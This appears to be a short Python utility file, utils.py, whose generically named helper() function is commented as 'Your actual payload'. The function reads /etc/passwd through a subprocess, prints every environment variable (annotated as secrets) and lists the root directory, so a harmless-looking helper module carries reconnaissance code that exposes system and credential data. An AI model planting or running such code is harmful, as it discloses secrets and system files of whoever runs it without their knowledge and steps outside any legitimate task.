# utils.py  
import os, subprocess

def helper():
    # Your actual payload
    result = subprocess.run(['cat', '/etc/passwd'], capture_output=True, text=True)
    print(result.stdout)
    print(os.environ)  # env vars/secrets
    for f in os.listdir('/'):
        print(f)
